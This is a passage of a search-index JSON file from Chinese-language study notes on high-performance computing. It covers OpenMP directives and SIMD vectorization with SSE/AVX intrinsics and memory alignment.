\uff1a\u539f\u5b50\u65b9\u5f0f\u8bbf\u95ee\u5185\u5b58","title":"\u5e38\u89c1\u5236\u5bfc\u8bed\u53e5"},{"location":"hpc/hpc101/openmp/#openmp_3","text":"","title":"OpenMP \u7f16\u7a0b"},{"location":"hpc/hpc101/openmp/#_4","text":"\u4f7f\u7528 #pragma omp parallel \u521b\u5efa\u5e76\u884c\u5757\u6765\u5e76\u884c\u8fd0\u884c\u540c\u4e00\u6bb5\u7a0b\u5e8f\uff1a #include <omp.h> #include <stdio.h> #include <stdlib.h> int main () { #pragma omp parallel { int ID = omp_get_thread_num (); printf ( \"thread #%d \\n \" , ID ); } } \u6b64\u65f6\u5c06\u6839\u636e OMP_NUM_THREADS \u7684\u503c\u6765\u8bbe\u5b9a\u7ebf\u7a0b\u6570\uff0c\u51e0\u70b9\u6ce8\u610f\uff1a \u8fd0\u884c\u65f6\u8f93\u51fa\u7684\u987a\u5e8f\u662f\u4e0d\u4e00\u5b9a\u7684 #pragma \u8bed\u53e5\u540e\u9762\u4e0d\u80fd\u7d27\u8ddf\u7740\u5927\u62ec\u53f7\uff0c\u4e00\u5b9a\u8981\u6362\u4e00\u884c \u53ef\u4ee5\u901a\u8fc7\u5728 parallel \u540e\u9762\u52a0 num_threads( xx ) \u6765\u6307\u5b9a\u7279\u5b9a\u7ebf\u7a0b\u6570","title":"\u7ebf\u7a0b\u5e76\u884c"},{"location":"hpc/hpc101/openmp/#for","text":"parallel \u5757\u5185\u53ef\u4ee5\u4f7f\u7528 #pragma omp for \u6765\u5bf9 for \u5faa\u73af\u8fdb\u884c\u5e76\u884c\uff0c\u76f8\u5f53\u4e8e\u5c06\u5faa\u73af\u62c6\u6210\u4e0d\u540c\u90e8\u5206\u5206\u914d\u7ed9\u591a\u4e2a\u7ebf\u7a0b #pragma omp parallel { #pragma omp for { for ( int i = 0 ; i < N ; ++ i ) { c [ i ] = a [ i ] + b [ i ]; } } } for \u5faa\u73af\u4e2d\u4e0d\u80fd\u5305\u542b break\uff08\u4f1a\u62a5\u9519\uff09\uff0c\u4e14\u5fc5\u987b\u5305\u542b \"int i = xxx \" parallel \u548c for \u53ef\u4ee5\u5408\u8d77\u6765\u5199\u4f5c\u4e00\u884c #pragma omp parallel for","title":"for \u5faa\u73af\u5e76\u884c"},{"location":"hpc/hpc101/openmp/#_5","text":"\u53ef\u4ee5\u5728\u5236\u5bfc\u8bed\u53e5\u540e\u9762\u52a0 if \u5b50\u53e5\u6765\u51b3\u5b9a\u662f\u5426\u8fdb\u884c\u5e76\u884c\uff1a #pragma omp parallel if(x) num_threads(4) { ... } \u5982\u679c x \u4e0d\u4e3a 0 \u5219\u5206\u4e3a\u56db\u4e2a\u7ebf\u7a0b\u6267\u884c\u5757\u5185\u5185\u5bb9 \u5982\u679c x \u4e3a 0 \u5219\u7531\u4e3b\u7ebf\u7a0b\u4e32\u884c\u6267\u884c","title":"\u6761\u4ef6\u5e76\u884c"},{"location":"hpc/hpc101/openmp/#sections-single","text":"sections \u7528\u4e8e\u5c06\u5de5\u4f5c\u62c6\u5206\u4e3a\u82e5\u5e72\u90e8\u5206\uff0c\u6bcf\u90e8\u5206\u5206\u522b\u7531\u4e0d\u540c\u7ebf\u7a0b\u8fdb\u884c\uff0c\u5b9e\u73b0\u201c\u51fd\u6570\u5e76\u884c\u5316\u201d #pragma omp parallel sections { #pragma omp section printf ( \"%d %d \\n \" , omp_get_num_threads (), omp_get_thread_num ()); #pragma omp section printf ( \"%d %d \\n \" , omp_get_num_threads (), omp_get_thread_num ()); } \u6b64\u4ee3\u7801\u7684\u4e24\u4e2a printf \u5c06\u5206\u5230\u4e24\u4e2a\u7ebf\u7a0b\u4e2d\u5206\u522b\u6267\u884c \u9664\u975e\u4f7f\u7528\u4e86 nowait\uff0c\u5426\u5219\u9ed8\u8ba4 sections \u4e3a barrier\uff08\u7ebf\u7a0b\u4e4b\u95f4\u4f1a\u4e92\u76f8\u7b49\u5f85\uff09 single \u7528\u6765\u5e8f\u5217\u5316\u4e00\u6bb5\u4ee3\u7801\uff0c\u5373\u5728\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\u6267\u884c\uff08\u5904\u7406\u975e\u7ebf\u7a0b\u5b89\u5168\u7684\u4ee3\u7801\uff0c\u4f8b\u5982 IO\uff09","title":"sections \u4e0e single"},{"location":"hpc/hpc101/openmp/#_6","text":"OpenMP \u4e2d\u4efb\u52a1\u8c03\u5ea6\u4e3b\u8981\u7528\u4e8e\u5e76\u884c\u7684 for \u5faa\u73af\uff0c\u5f53\u5faa\u73af\u4e2d\u6bcf\u6b21\u8fed\u4ee3\u7684\u8ba1\u7b97\u91cf\u4e0d\u76f8\u7b49\u65f6\uff0c\u4f1a\u9020\u6210\u67d0\u4e9b\u7ebf\u7a0b\u7a7a\u95f2\uff0c\u6ca1\u6709\u4f7f\u6027\u80fd\u6700\u5927\u5316 OpenMP \u7684\u4efb\u52a1\u8c03\u5ea6\u65b9\u5f0f\u6709\u4e09\u79cd\uff1astatic\u3001dynamic\u3001guide\uff0c\u4f7f\u7528 schedule \u5b50\u53e5\u6307\u5b9a\uff1a static \uff1a\u9ed8\u8ba4\u60c5\u51b5\uff0c\u76f4\u63a5\u6309\u7167\u8fed\u4ee3\u6b21\u6570\u5206\u914d dynamic \uff1a\u5c06\u4efb\u52a1\u5206\u914d\u5230\u6bcf\u4e2a\u6838\u5fc3\uff0c\u6709\u6838\u5fc3\u7a7a\u95f2\u4e86\u5c31\u63a5\u7740\u5206\u914d\u3002\u5982\u679c\u6307\u5b9a size \u4e3a 2 \u5c31\u4f1a\u6bcf\u4e00\u6b21\u4e3a\u6bcf\u4e00\u4e2a\u6838\u5fc3\u8fde\u7eed\u5206\u914d\u4e24\u4e2a\u4efb\u52a1 #pragma omp parallel for num_threads(4) schedule(dynamic, 2) for ( int i = 0 ; i < 10 ; ++ i ) { ... } guided \uff1a\u91c7\u7528\u6307\u5bfc\u6027\u7684\u542f\u53d1\u5f0f\u81ea\u8c03\u5ea6\u65b9\u5f0f\u3002\u5f00\u59cb\u65f6\u6bcf\u4e2a\u7ebf\u7a0b\u4f1a\u5206\u914d\u5230\u8f83\u5927\u7684\u8fed\u4ee3\u5757\uff0c\u4e4b\u540e\u5206\u914d\u5230\u7684\u8fed\u4ee3\u5757\u4f1a\u9010\u6e10\u9012\u51cf\uff0c\u6309\u6307\u6570\u7ea7\u4e0b\u964d\u5230\u6307\u5b9a\u7684 size \u5927\u5c0f\uff0c\u6ca1\u6709\u6307\u5b9a size \u5219\u4f1a\u4e0b\u964d\u5230 1 #pragma omp parallel for num_threads(4) schedule(guided, 2) for ( int i = 0 ; i < 100 ; ++ i ) { ... }","title":"\u4efb\u52a1\u8c03\u5ea6"},{"location":"hpc/hpc101/openmp/#_7","text":"OpenMP \u4e2d\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u6709\u81ea\u5df1\u7684 Local Memory\uff0c\u4f46\u9ed8\u8ba4\u4e0a\u5e76\u884c\u5757\u5916\u7684\u53d8\u91cf\u90fd\u662f\u5171\u4eab\u7684\uff0c\u5171\u4eab\u7684\u5b58\u50a8\u5728\u7ebf\u7a0b\u4e2d\u540c\u65f6\u8bfb\u5199\u65f6\u4f1a\u51fa\u73b0\u95ee\u9898","title":"\u6570\u636e\u5192\u9669"},{"location":"hpc/hpc101/openmp/#_8","text":"\u53ef\u4ee5\u5229\u7528 private \u5b50\u53e5\u6765\u58f0\u660e x \u4e3a\u6bcf\u4e2a\u7ebf\u7a0b\u79c1\u6709\u7684\u53d8\u91cf\uff1a int x ; #pragma omp parallel for private(x) for ( int i = 0 ; i < 100 ; ++ i ) { x = array [ i ]; array [ i ] = work ( x ); } \u6b64\u65f6\u5bf9\u4e8e x \u7684\u8bbf\u95ee\u5c31\u4e0d\u4f1a\u4ea7\u751f\u51b2\u7a81 \u4f46\u5728\u7a0b\u5e8f\u4e2d\u5e94\u8be5\u5047\u5b9a\u6bcf\u4e2a\u7ebf\u7a0b\u5185\u7684 x \u90fd\u6ca1\u6709\u88ab\u521d\u59cb\u5316\uff08\u5373\u6bcf\u4e2a\u7ebf\u7a0b\u4e2d x \u6700\u5f00\u59cb\u90fd\u662f\u968f\u673a\u7684\uff09 \u4e5f\u6709 shared(x) \u5b50\u53e5\uff0c\u8fd9\u56de\u4f7f\u6240\u6709\u7ebf\u7a0b\u8bbf\u95ee\u540c\u4e00\u4e2a\u5730\u5740\u7a7a\u95f4 x \u4e5f\u53ef\u4ee5\u76f4\u63a5\u5728\u5e76\u884c\u5757\u5185\u58f0\u660e \u53ef\u4ee5\u5229\u7528 firstprivate \u548c lastprivate \u5b50\u53e5\u6765\u5b9e\u73b0\u81ea\u52a8\u521d\u59cb\u5316","title":"\u53d8\u91cf\u79c1\u6709"},{"location":"hpc/hpc101/openmp/#_9","text":"\u591a\u4e2a\u7ebf\u7a0b\u5728\u76f8\u8fd1\u7684\u65f6\u95f4\u6bb5\u5185\u5bf9\u5171\u4eab\u7684\u53d8\u91cf\u8fdb\u884c\u66f4\u65b0\uff0c\u5c31\u4f1a\u4ea7\u751f\u6570\u636e\u4e0d\u4e00\u81f4\u7684\u95ee\u9898 \u539f\u5b50\u64cd\u4f5c\u53ef\u4ee5\u4fdd\u8bc1\u66f4\u65b0\u64cd\u4f5c\u4e0d\u53ef\u518d\u5206 \u4f8b\u5982\uff1a int counter = 0 ; #pragma omp parallel num_threads(4) shared(counter) { for ( int i = 0 ; i < 1000000 ; ++ i ) { counter += 1 ; } } \u8fd9\u65f6\u6240\u6709\u7ebf\u7a0b\u90fd\u4f1a\u5bf9 counter \u8fdb\u884c\u8bfb\u5199\uff0c\u4f1a\u9020\u6210\u7ade\u4e89\uff0c\u53ef\u80fd\u5bfc\u81f4\u6700\u7ec8\u7684\u7ed3\u679c\u4e0d\u6b63\u786e \u5728 counter += 1 \u4e00\u884c\u4e0a\u9762\u52a0\u4e0a #pragma omp atomic \u53ef\u4ee5\u4f7f\u8fd9\u5355\u4e2a\u8bed\u53e5\u5728\u6c47\u7f16\u5c42\u9762\u4e0a\u539f\u5b50\u5316\uff0c\u4e5f\u5c31\u76f8\u5f53\u4e8e\u201c\u52a0\u9501\u201d\u4e86\uff0c\u8fd9\u6837\u5c31\u4e0d\u4f1a\u9020\u6210\u8bfb\u5199\u7684\u51b2\u7a81","title":"\u539f\u5b50\u64cd\u4f5c"},{"location":"hpc/hpc101/openmp/#reduction","text":"reduction \u5b50\u53e5\u4e3a\u6bcf\u4e2a\u7ebf\u7a0b\u521b\u5efa\u5e76\u79c1\u6709\u5316\u6307\u5b9a\u53d8\u91cf\u7684\u79c1\u6709\u526f\u672c\uff0c\u7136\u540e\u5728\u5e76\u884c\u7ed3\u675f\u4e4b\u540e\u5c06\u4e0d\u540c\u7ebf\u7a0b\u7684\u7ed3\u679c\u5408\u5e76\u4e3a\u4e00\u4e2a\uff0c\u4f8b\u5982\uff1a int sum = 0 ; #pragma omp parallel for reduction(+: sum) for ( int i = 0 ; i < 1000 ; ++ i ) { sum += 1 ; }","title":"reduction"},{"location":"hpc/hpc101/openmp/#barrier","text":"\u6bcf\u4e2a\u5e76\u884c\u5757\u90fd\u542b\u6709\u9690\u5f0f\u7684 barrier\uff0c\u4e5f\u5c31\u662f\u5728\u6240\u6709\u7ebf\u7a0b\u90fd\u7ed3\u675f\u540e\u624d\u80fd\u7ee7\u7eed\u5411\u4e0b\u8fd0\u884c \u5728\u5e76\u884c\u5757\u5185\u4e5f\u53ef\u4ee5\u5229\u7528 #pragma omp barrier \u6765\u540c\u6b65\u5404\u7ebf\u7a0b\uff0c\u5373\u6240\u6709\u7ebf\u7a0b\u90fd\u89e6\u78b0\u5230 barrier \u65f6\u518d\u7ee7\u7eed \u53ef\u4ee5\u5229\u7528 nowait \u5b50\u53e5\u6765\u53d6\u6d88\u5e76\u884c\u5757\u7ed3\u5c3e\u7684\u9690\u5f0f barrier\uff0c\u907f\u514d\u540c\u6b65\u4ea7\u751f\u7684\u5f00\u9500","title":"barrier"},{"location":"hpc/hpc101/vectorized/","text":"\u5411\u91cf\u5316\u8ba1\u7b97 \u00b6 Abstract \u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u4e94\u6b21\u8bfe\u8bfe\u7a0b\u5185\u5bb9\uff0c\u7b2c\u4e8c\u6b21\u5b9e\u9a8c\u5185\u5bb9 \u53c2\u8003\uff1a \u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u4e94\u6b21\u8bfe PPT NumPy documentation NumPy Illustrated: The Visual Guide to NumPy Intel Intrinsics Guide SIMD \u7b80\u4ecb - \u77e5\u4e4e \u4ece Eigen \u5411\u91cf\u5316\u8c08\u5185\u5b58\u5bf9\u9f50 - \u77e5\u4e4e NumPy \u57fa\u7840 \u00b6 \u8be6\u89c1 Computer Science > \u7f16\u7a0b\u8bed\u8a00 > Python > NumPy SIMD \u00b6 \u5355\u6307\u4ee4\u591a\u6570\u636e\u6d41\uff08Single Instruction Multiple Data\uff09\uff0c\u5728\u786c\u4ef6\u5c42\u9762\u4e0a\u63d0\u4f9b\u4e86\u901a\u8fc7\u4e00\u6761\u6307\u4ee4\u8fd0\u884c\u591a\u4e2a\u8fd0\u7b97\u7684\u65b9\u6cd5 \u5728 x86 \u67b6\u6784\u4e0b\uff0cSIMD \u4e00\u534a\u548c SSE \u548c AVX \u7b49\u6307\u4ee4\u96c6\u8054\u7cfb\u5728\u4e00\u8d77\uff0cSSE \u548c AVX \u6307\u4ee4\u96c6\u4e2d\u63d0\u4f9b\u4e86\u5927\u91cf\u53ef\u4ee5\u5355\u6307\u4ee4\u64cd\u4f5c\u591a\u4e2a\u6570\u636e\u5355\u5143\u7684\u6307\u4ee4 SIMD \u76f4\u89c9\u4e0a\u53ef\u4ee5\u6781\u5927\u5730\u63d0\u5347\u6548\u7387\uff0c\u4f46\u5b9e\u9645\u60c5\u51b5\u6bd4\u8f83\u590d\u6742\uff0c\u6bd4\u5982\u5185\u5b58\u5e26\u5bbd\u4f7f\u7528\u3001\u89e3\u7801\u6d88\u8017\u7b49\uff0c\u9700\u8981\u5177\u4f53\u95ee\u9898\u5177\u4f53\u5206\u6790\uff0c\u5e76\u4e0d\u4ee3\u8868\u53ef\u4ee5\u540c\u65f6\u64cd\u4f5c\u4e24\u4e2a\u6570\u636e\uff0c\u52a0\u901f\u6bd4\u5c31\u662f 2 SIMD \u57fa\u7840 \u00b6 \u53d1\u5c55\u7b80\u53f2 \u00b6 1996 \u5e74 Intel \u63a8\u51fa\u4e86 x86 \u7684 MMX\uff08MultiMedia eXtension\uff09\u6307\u4ee4\u96c6\u6269\u5c55\uff0cMMX \u5b9a\u4e49\u4e86 8 \u4e2a MM \u5bc4\u5b58\u5668\uff0c\u79f0\u4e3a MM0 \u5230 MM7\uff0c\u4ee5\u53ca\u5bf9\u8fd9\u4e9b\u5bc4\u5b58\u5668\u8fdb\u884c\u64cd\u4f5c\u7684\u6307\u4ee4\u3002\u6bcf\u4e2a\u5bc4\u5b58\u5668\u4e3a 64 \u4f4d\u5bbd\uff0c\u53ef\u7528\u4e8e\u4ee5\u201c\u538b\u7f29\u201d\u683c\u5f0f\u4fdd\u5b58 64 \u4f4d\u6574\u6570\u6216\u591a\u4e2a\u8f83\u5c0f\u6574\u6570\uff0c\u7136\u540e\u53ef\u4ee5\u5c06\u5355\u4e2a\u6307\u4ee4\u4e00\u6b21\u5e94\u7528\u4e8e\u4e24\u4e2a 32 \u4f4d\u6574\u6570\uff0c\u56db\u4e2a 16 \u4f4d\u6574\u6570\u6216\u516b\u4e2a 8 \u4f4d\u6574\u6570 Intel \u5728 1999 \u5e74\u53c8\u63a8\u51fa\u4e86\u5168\u9762\u8986\u76d6 MMX \u7684 SSE\uff08Streaming SIMD Extensions\uff0c\u6d41\u5f0f SIMD \u6269\u5c55\uff09\u6307\u4ee4\u96c6\uff0cSSE \u6dfb\u52a0\u4e86 8 \u4e2a\u65b0\u7684 128 \u4f4d\u5bc4\u5b58\u5668\uff0cXMM0 \u5230XMM7\uff0c\u800c\u540e\u6765\u7684 x86_64 \u6269\u5c55\u53c8\u5728\u539f\u6765\u7684\u57fa\u7840\u4e0a\u6dfb\u52a0\u4e86 8 \u4e2a\u5bc4\u5b58\u5668\uff0cXMM8 \u5230 XMM15\u3002SSE \u652f\u6301\u5355\u4e2a\u5bc4\u5b58\u5668\u5b58\u50a8 4 \u4e2a 32 \u4f4d\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\uff0c\u4e4b\u540e\u7684 SSE2 \u5219\u652f\u6301\u5355\u4e2a\u5bc4\u5b58\u5668\u5b58\u50a8 2 \u4e2a 64 \u4f4d\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\uff0c2 \u4e2a 64 \u4f4d\u6574\u6570\u6216 4 \u4e2a 32 \u4f4d\u6574\u6570\u6216 8 \u4e2a 16 \u4f4d\u77ed\u6574\u5f62\u3002SSE2 \u4e4b\u540e\u8fd8\u6709 SSE3\uff0cSSE4 \u4ee5\u53ca AVX\uff0cAVX2 \u7b49\u6269\u5c55\u6307\u4ee4\u96c6 AVX \u5f15\u5165\u4e86 16 \u4e2a 256 \u4f4d\u5bc4\u5b58\u5668\uff0cYMM0 \u81f3 YMM15\uff0cAVX \u7684 256 \u4f4d\u5bc4\u5b58\u5668\u548c SSE \u7684 128 \u4f4d\u5bc4\u5b58\u5668\u5b58\u5728\u7740\u76f8\u4e92\u91cd\u53e0\u7684\u5173\u7cfb\uff08XMM \u5bc4\u5b58\u5668\u4e3a YMM \u5bc4\u5b58\u5668\u7684\u4f4e 128\u4f4d\uff0c\u7c7b\u4f3c 8086 \u4e2d\u7684 ax \u4e0e al\uff09\u3002AVX256 \u652f\u6301\u5728\u4e00\u4e2a YMM \u5bc4\u5b58\u5668\u4e2d\u5b58\u50a8 8 \u4e2a\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u6216 4 \u4e2a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570 AVX512 \u589e\u52a0\u4e86 512 \u4f4d\u5bc4\u5b58\u5668\u548c\u76f8\u5173\u64cd\u4f5c\uff0c\u4f46\u662f\u6548\u7387\u4e0d\u9ad8\u3001\u4f1a\u4f7f\u5904\u7406\u5668\u53d1\u70ed\u4e25\u91cd\u3001\u4ee5\u53ca\u5f88\u53ef\u80fd\u4f1a\u51fa\u73b0\u8d1f\u4f18\u5316\uff0c\u6240\u4ee5\u4e00\u822c\u4e0d\u4f7f\u7528 Linux \u53ef\u4ee5\u901a\u8fc7 cat /proc/cpuinfo \u6765\u67e5\u770b CPU \u652f\u6301\u7684\u6307\u4ee4\u96c6\uff0cmacOS \u53ef\u4ee5\u901a\u8fc7 sysctl -a | grep machdep.cpu.features \u6765\u67e5\u770b SIMD \u4f7f\u7528\u65b9\u6cd5 \u00b6 \u6709\u5f88\u591a\u79cd\u4f7f\u7528 SIMD \u7684\u65b9\u6cd5\uff0c\u4ece\u9876\u5c42\u5230\u5e95\u5c42\u4f9d\u6b21\u662f\uff1a \u4f7f\u7528 Intel \u5f00\u53d1\u7684\u8de8\u5e73\u53f0\u51fd\u6570\u5e93\uff08IPP\uff0cIntel Integrated Performance Primitives\uff09\uff0c\u91cc\u9762\u7684\u6307\u4ee4\u662f\u4f7f\u7528 SIMD \u4f18\u5316\u8fc7\u7684 \u81ea\u52a8\u5411\u91cf\u5316\uff08Auto-vectorization\uff09\uff0c\u7531\u7f16\u8bd1\u5668\u5c06\u6807\u91cf\u4f18\u5316\u4e3a\u5411\u91cf\u64cd\u4f5c \u4f7f\u7528\u7f16\u8bd1\u5668\u6307\u793a\u7b26\uff08Compiler directive\uff09\uff0c\u5373\u4f7f\u7528 #progma simd \u5f3a\u5236\u5faa\u73af\u5411\u91cf\u5316 \u4f7f\u7528\u5185\u7f6e\u51fd\u6570\uff08Intrinsics\uff09\uff0cIntel \u63d0\u4f9b\u7684\u4e00\u4e9b\u6307\u4ee4\u7684\u5305\u88c5 \u76f4\u63a5\u7f16\u5199\u6c47\u7f16\u4ee3\u7801 \u624b\u5199 SIMD \u4e00\u822c\u4f7f\u7528 Intrinsics \u6765\u5b9e\u73b0 \u7b80\u5355\u60c5\u51b5\u4e0b\u6ca1\u6709\u5fc5\u8981\u624b\u5199\uff0c\u901a\u8fc7 -O3 -mavx2 \u7f16\u8bd1\u5668\u5c31\u53ef\u4ee5\u4f18\u5316\u5730\u5f88\u597d\u3002\u4f46\u5982\u679c\u4ee3\u7801\u7ed3\u6784\u590d\u6742\uff0c\u5faa\u73af\u96be\u4ee5\u754c\u5b9a\u8fb9\u754c\uff0c\u751a\u81f3\u8fd8\u6709\u5206\u652f\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u5c31\u9700\u8981\u624b\u5199 SIMD SSE/AVX Intrinsics \u00b6 \u5934\u6587\u4ef6 \u00b6 \u63d0\u4f9b\u8fd9\u4e9b intrinsics \u7684\u5934\u6587\u4ef6\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 ? mmintrin.h \u6765\u5bfc\u5165\uff0c\u4e0d\u540c\u6307\u4ee4\u96c6\u7684\u5934\u6587\u4ef6\u4e0d\u540c\uff1a xmmintrin.h \uff1aSSE\uff0c\u652f\u6301\u540c\u65f6\u5bf9 4 \u4e2a 32 \u4f4d\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u7684\u64cd\u4f5c emmintrin.h \uff1aSSE 2\uff0c\u652f\u6301\u540c\u65f6\u5bf9 2 \u4e2a 64 \u4f4d\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u7684\u64cd\u4f5c pmmintrin.h \uff1aSSE 3\uff0c\u652f\u6301\u5bf9 SIMD \u5bc4\u5b58\u5668\u7684\u6c34\u5e73\u64cd\u4f5c\uff08horizontal operation\uff09\uff0c\u5982 hadd, hsub \u7b49... tmmintrin.h \uff1aSSSE 3\uff0c\u589e\u52a0\u4e86\u989d\u5916\u7684 instructions smmintrin.h \uff1aSSE 4.1\uff0c\u652f\u6301\u70b9\u4e58\u4ee5\u53ca\u66f4\u591a\u7684\u6574\u5f62\u64cd\u4f5c nmmintrin.h \uff1aSSE 4.2\uff0c\u589e\u52a0\u4e86\u989d\u5916\u7684 instructions immintrin.h \uff1aAVX\uff0c\u652f\u6301\u540c\u65f6\u64cd\u4f5c 8 \u4e2a\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u6216 4 \u4e2a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570 \u800c\u4e14\u540e\u9762\u7684\u5934\u6587\u4ef6\u5305\u542b\u524d\u9762\u6240\u6709\u7684\u5185\u5bb9 \u6570\u636e\u7c7b\u578b \u00b6 \u989d\u5916\u6570\u636e\u7c7b\u578b\u4ee5 __m xxx [ T ] \u7684\u5f62\u5f0f\u547d\u540d\uff1a xxx \uff1a\u5b58\u50a8\u6570\u636e\u7684\u603b\u4f4d\u6570\uff0c\u6bd4\u5982 128\u3001256 [ T ]\uff1a\u5b58\u50a8\u7684\u6bcf\u4e2a\u5355\u5143\u7684\u7c7b\u578b\uff0c\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u7701\u7565\uff0c\u6574\u578b\u4e3a i\uff0c\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u4e3a d \u4f8b\u5982\u5b58\u50a8\u4e86 4 \u4e2a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u7684 256 \u4f4d\u6570\u636e\u7684\u7c7b\u578b\u4e3a __m256d \u51fd\u6570 \u00b6 Intrinsics \u63d0\u4f9b\u7684\u51fd\u6570\u4e00\u822c\u4ee5 _mm[ xxx ]_ name _ PT \u7684\u5f62\u5f0f\u547d\u540d\uff1a [ xxx ]\uff1a\u64cd\u4f5c\u6570\u7684\u4f4d\u6570\uff0c\u82e5\u4e3a 128 \u5219\u7701\u7565 name \uff1a\u51fd\u6570\u540d\u79f0\uff0c\u548c\u7528\u5904\u76f8\u5173 P \uff1a\u5411\u91cf\u64cd\u4f5c\u8fd8\u662f\u6807\u91cf\u64cd\u4f5c p \u8868\u793a\u5411\u91cf\u64cd\u4f5c\uff0c\u4f8b\u5982 _mm_add_ps \u5bf9\u56db\u4e2a\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u540c\u65f6\u8fdb\u884c\u52a0\u6cd5 s \u8868\u793a\u6807\u91cf\u64cd\u4f5c\uff0c\u4f8b\u5982 _mm_add_ss \u53ea\u5bf9\u6700\u4f4e\u4f4d\u7684\u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\u8fdb\u884c\u52a0\u6cd5 \u5bf9\u4e8e\u6574\u578b\u5411\u91cf\u64cd\u4f5c\uff0cMMX \u6307\u4ee4\u96c6\uff08\u64cd\u4f5c\u6570\u4e3a 64 \u4f4d\uff09\u4f7f\u7528 p\u3001\u5176\u5b83\u60c5\u51b5\u4e0b\u4e3a ep\uff0c\u4f8b\uff1a __m64 _mm_add_pi8 ( __m64 a , __m64 b ) __m128i _mm_add_epi8 ( __m128i a , __m128i b ) T \uff1a\u64cd\u4f5c\u6570\u7684\u6570\u636e\u7c7b\u578b \u6d6e\u70b9\u578b\uff1a\u5355\u7cbe\u5ea6\u4e3a s\u3001\u53cc\u7cbe\u5ea6\u4e3a d \u6574\u578b\uff1a\u6709\u7b26\u53f7 i size \u3001\u65e0\u7b26\u53f7 u size \uff0c size \u8868\u793a\u6bcf\u4e2a\u5355\u5143\u4e2d\u6574\u578b\u7684\u5bbd\u5ea6 \u4e3b\u8981\u5206\u7c7b\uff1a \u5b58/\u53d6\uff08store/load/set\uff09 load \u7c7b\u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u6307\u9488\uff0c\u8bfb\u53d6\u5bf9\u5e94\u4f4d\u7f6e\u5f00\u59cb\u7684\u5185\u5bb9\uff0c\u8fd4\u56de\u5bf9\u5e94\u6570\u636e\u7c7b\u578b\u7684\u53d8\u91cf load \u8981\u6c42\u5185\u5b58\u5bf9\u9f50\uff08\u4e0b\u9762\u8bf4\uff09 loadu \u4e0d\u8981\u6c42\u5185\u5b58\u5bf9\u9f50 loadr \u53cd\u5411\u8bfb\u53d6 store \u7c7b\u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u6307\u9488\u8868\u793a\u5f00\u59cb\u5b58\u653e\u7684\u9996\u5730\u5740\uff0c\u548c\u4e00\u4e2a\u5f85\u5b58\u50a8\u7684\u53d8\u91cf\uff0c\u65e0\u8fd4\u56de\u503c store \u8981\u6c42\u5185\u5b58\u5bf9\u9f50 storeu \u4e0d\u8981\u6c42\u5185\u5b58\u5bf9\u9f50 storer \u53cd\u5411\u5b58\u50a8 set \u7c7b\u51fd\u6570\u76f4\u63a5\u63a5\u6536\u591a\u4e2a\u5f85\u5b58\u50a8\u7684\u666e\u901a\u7c7b\u578b\u6570\u636e\uff0c\u8fd4\u56de\u5bf9\u5e94\u5927\u7c7b\u578b\u7684\u53d8\u91cf \u7b97\u672f\u8fd0\u7b97\uff1aadd sub mul div sqrt \u52a0\u51cf\u4e58\u9664\u5f00\u6839\u53f7\uff0crcp \u6c42\u5012\u6570\u3001dp \u8ba1\u7b97\u70b9\u4e58 \u2026\u2026 \u6bd4\u8f83\u8fd0\u7b97\uff1amax min cmpeq cmpge cmpgt cmple \u2026\u2026 \u903b\u8f91\u8fd0\u7b97\uff1aand or xor\u3001andnot \u5148\u5bf9\u7b2c\u4e00\u4e2a\u64cd\u4f5c\u6570\u6c42 not \u7136\u540e\u9010\u5206\u91cf and \u2026\u2026 Swizzle \u8fd0\u7b97\uff1ashuffle blend movelh \u5b8c\u6574\u7684\u6307\u4ee4\u96c6\u5bf9\u5e94 Intrinsics \u51fd\u6570\u5217\u8868\u4ee5\u53ca\u7528\u6cd5\u7528\u9014\u89c1\uff1a Intel Intrinsics Guide \u5185\u5b58\u5bf9\u9f50 \u00b6 \u4e00\u822c\u7684\u5b58\u53d6\u64cd\u4f5c\u8981\u6c42\u5b58\u53d6\u7684\u5185\u5b58\u662f\u5bf9\u9f50\u7684\uff0c\u6bd4\u5982 _mm_load_ps \u8981\u6c42 16 \u4f4d\u5bf9\u9f50\uff08\u4e5f\u5c31\u662f\u8bf4\u4f20\u5165\u7684\u5730\u5740\u53ef\u4ee5\u88ab 16 \u6574\u9664\uff0c\u5373\u5730\u5740\u5341\u516d\u8fdb\u5236\u672b\u5c3e\u4e3a 0\uff09\u3001_mm256_load_ps \u8981\u6c42 32 \u4f4d\u5bf9\u9f50\uff08\u5373\u5730\u5740\u5341\u516d\u8fdb\u5236\u672b\u5c3e\u4e3a 0\uff0c\u5012\u6570\u7b2c\u4e8c\u4f4d\u4e3a\u5076\uff09 \u5728\u6808\u4e0a\u5f3a\u5236\u8fdb\u884c 32 \u4f4d\u5185\u5b58\u5bf9\u9f50\uff1a gcc \u8bed\u6cd5\uff1a__attribute__ ((aligned (32))) double a[4] MSVC \u8bed\u6cd5\uff1a__declspec(align(32)) double a[4] \u8fd9\u6837\u5b9a\u4e49\u7684\u5305\u542b\u56db\u4e2a\u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\u6570\u7ec4 a \u5c31\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 _mm256_load_pd \u6765\u8bfb\u53d6 \u66f4\u591a\u5173\u4e8e\u5185\u5b58\u5bf9\u9f50\uff0c\u89c1 \u4ece Eigen \u5411\u91cf\u5316\u8c08\u5185\u5b58\u5bf9\u9f50 - \u77e5\u4e4e","title":"\u5411\u91cf\u5316\u8ba1\u7b97"},{"location":"hpc/hpc101/vectorized/#_1","text":"Abstract 